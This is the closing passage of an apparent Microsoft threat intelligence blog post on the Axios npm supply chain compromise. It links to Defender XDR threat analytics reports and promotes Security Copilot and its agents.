+Microsoft Defender XDR customers can use the following [threat analytics](https://learn.microsoft.com/defender-xdr/threat-analytics) reports in the Defender portal (requires license for at least one Defender XDR product) to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments:
+[Activity profile: Mitigating the Axios npm supply chain compromise](https://security.microsoft.com/threatanalytics3/22b71a55-3c2a-4634-856d-0e937a95834b/overview)[Threat profile overview: North Korea state-sponsored activity](https://security.microsoft.com/threatanalytics3/b24de28e-e504-4266-ae56-902d1abed27c/overview?)[Technique profile: Malicious npm lifecycle scripts](https://security.microsoft.com/threatanalytics3/abc7c39c-4ca0-4325-bcbf-18a3bc8fab01/overview)[Actor profile: Sapphire Sleet](https://security.microsoft.com/threatanalytics3/5ab8c4d1-be7d-4ef9-88b0-6e4f8c356f84/overview)
+Microsoft Security Copilot customers can also use the [Microsoft Security Copilot integration](https://learn.microsoft.com/defender/threat-intelligence/security-copilot-and-defender-threat-intelligence?bc=%2Fsecurity-copilot%2Fbreadcrumb%2Ftoc.json&toc=%2Fsecurity-copilot%2Ftoc.json#turn-on-the-security-copilot-integration-in-defender-ti) in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the [embedded experience](https://learn.microsoft.com/defender/threat-intelligence/using-copilot-threat-intelligence-defender-xdr) in the Microsoft Defender portal to get more information about this threat actor.
+Microsoft Security Copilot
+[Microsoft Security Copilot](https://www.microsoft.com/en-us/security/business/ai-machine-learning/microsoft-security-copilot) is [embedded in Microsoft Defender](https://learn.microsoft.com/defender-xdr/security-copilot-in-microsoft-365-defender) and provides security teams with AI-powered capabilities to summarize incidents, analyze files and scripts, summarize identities, use guided responses, and generate device summaries, hunting queries, and incident reports.
+Customers can also [deploy AI agents](https://learn.microsoft.com/defender-xdr/security-copilot-agents-defender), including the following [Microsoft Security Copilot agents](https://learn.microsoft.com/copilot/security/agents-overview), to perform security tasks efficiently:
+[Threat Intelligence Briefing agent](https://learn.microsoft.com/defender-xdr/threat-intel-briefing-agent-defender)[Phishing Triage agent](https://learn.microsoft.com/defender-xdr/phishing-triage-agent)[Threat Hunting agent](https://learn.microsoft.com/defender-xdr/advanced-hunting-security-copilot-threat-hunting-agent)[Dynamic Threat Detection agent](https://learn.microsoft.com/defender-xdr/dynamic-threat-detection-agent)
+Security Copilot is also available as a [standalone experience](https://learn.microsoft.com/en-us/copilot/security/experiences-security-copilot) where customers can perform specific security-related tasks, such as incident investigation, user analysis, and vulnerability impact assessment. In addition, Security Copilot offers [developer scenarios](https://learn.microsoft.com/copilot/security/developer/custom-agent-overview) that allow customers to build, test, publish, and integrate AI agents and plugins to meet unique security needs.
+Learn more
+For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
+To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
+To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
